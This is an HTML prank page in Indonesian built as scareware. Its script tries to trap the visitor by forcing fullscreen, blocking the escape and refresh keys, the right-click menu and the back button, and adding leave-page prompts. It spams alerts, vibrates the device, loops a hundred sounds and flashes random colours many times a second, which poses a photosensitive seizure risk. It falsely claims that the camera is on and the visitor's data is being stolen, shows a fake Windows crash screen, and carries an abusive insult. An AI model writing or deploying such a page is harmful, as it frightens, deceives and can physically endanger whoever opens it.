<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>KEHADIRAN MEMATIKAN</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background: black;
      overflow: hidden;
      color: red;
      font-family: monospace;
      text-align: center;
    }
    #virusText {
      position: absolute;
      top: 40%;
      left: 50%;
      transform: translate(-50%, -50%);
      font-size: 2em;
      z-index: 999;
      animation: spamText 0.1s infinite;
    }
    @keyframes spamText {
      0% { transform: translate(-50%, -50%) rotate(0deg); }
      50% { transform: translate(-50%, -50%) rotate(360deg); }
      100% { transform: translate(-50%, -50%) rotate(0deg); }
    }
    .bsod {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: blue;
      color: white;
      font-family: monospace;
      font-size: 20px;
      display: none;
      z-index: 9999;
      padding: 20px;
    }
    .message {
      position: absolute;
      top: 10%;
      left: 10%;
      font-size: 3em;
      color: white;
      z-index: 10000;
    }
  </style>
</head>
<body>

  <div id="virusText">MENYUSUP KE SISTEM...</div>
  <div class="message">MAMPUS LU ANJING!</div>
  <div class="bsod" id="bsod">
    <p><b>SYSTEM FAILURE</b><br>
    Windows has encountered a critical error and will shut down.<br><br>
    STOP CODE: FAKE_PRANK_001<br>
    Press and hold power button...<br><br>
    <i>JANGAN PERNAH HINA ORANG TUA</i></p>
  </div>

  <!-- Audio Controls for User Interaction -->
  <button id="playAudioBtn" style="position: absolute; top: 10px; left: 10px; padding: 10px; font-size: 16px;">Play Horror Sounds</button>

  <script>
    // Prepare Audio Files
    const audioFiles = [];
    for (let i = 0; i < 100; i++) {
      const audio = new Audio(`https://www.myinstants.com/media/sounds/creepy-sound-${i+1}.mp3`);
      audio.loop = true;
      audio.volume = 0.5; // Adjust volume for better experience
      audioFiles.push(audio);
    }

    // Play Audio on Button Click
    document.getElementById("playAudioBtn").addEventListener("click", function () {
      audioFiles.forEach(audio => audio.play());
      this.style.display = "none"; // Hide the button after clicking
    });

    // Fullscreen & Lock
    document.body.requestFullscreen?.();
    document.addEventListener("contextmenu", e => e.preventDefault());
    document.addEventListener("keydown", e => {
      if (["F5", "F11", "Escape"].includes(e.key)) e.preventDefault();
    });
    window.onbeforeunload = () => "SISTEM MASIH AKTIF";
    history.pushState(null, null, location.href);
    window.onpopstate = () => {
      history.pushState(null, null, location.href);
    };

    // Prevent refresh & exit
    window.addEventListener("beforeunload", function (event) {
      event.returnValue = "SISTEM MASIH AKTIF!";
    });

    // Vibrate every 5 seconds
    if (navigator.vibrate) {
      setInterval(() => navigator.vibrate([500, 200, 500]), 4000);
    }

    // Alert Spam - Every 5 seconds
    setInterval(() => {
      alert("SISTEM DALAM PENGAWASAN");
    }, 5000);

    // Flash RGB & Shake
    setInterval(() => {
      document.body.style.background = `rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255})`;
      document.body.style.transform = `translate(${Math.random()*30 - 15}px, ${Math.random()*30 - 15}px) rotate(${Math.random()*10 - 5}deg)`;
    }, 150);

    // Create a Tumpukan Teks Spam
    const virusText = document.getElementById("virusText");
    const virusMsg = [
      "MENYUSUP KE SISTEM...",
      "MENGAKSES MEMORI...",
      "KAMERA DIAKTIFKAN...",
      "MEMANTAU LOKASI...",
      "DATA ANDA DIAMBIL...",
      "AKU LIHAT KAMU SEKARANG...",
      "JANGAN PERNAH HINA ORANG TUA!",
      "KAMU DIAWASI...",
    ];
    let i = 0;
    setInterval(() => {
      virusText.innerText = virusMsg[i % virusMsg.length];
      i++;
    }, 3000);

    // Fake BSOD after delay
    setTimeout(() => {
      document.getElementById("bsod").style.display = "block";
    }, 60000); // after 1 minute

    // Add more visual effects (shaking, flashing, etc.)
    setInterval(() => {
      document.body.style.transform = `translate(${Math.random()*30 - 15}px, ${Math.random()*30 - 15}px) rotate(${Math.random()*10 - 5}deg)`;
    }, 50);

    // Add 30 more features to make it worse (like screen shake, more popups, etc.)
    for (let i = 0; i < 30; i++) {
      setInterval(() => {
        document.body.style.background = `rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255})`;
      }, 100);
    }

    // Prevent any refresh/exit
    window.onbeforeunload = function () {
      return "SISTEM MASIH AKTIF!";
    };
  </script>

</body>
</html>
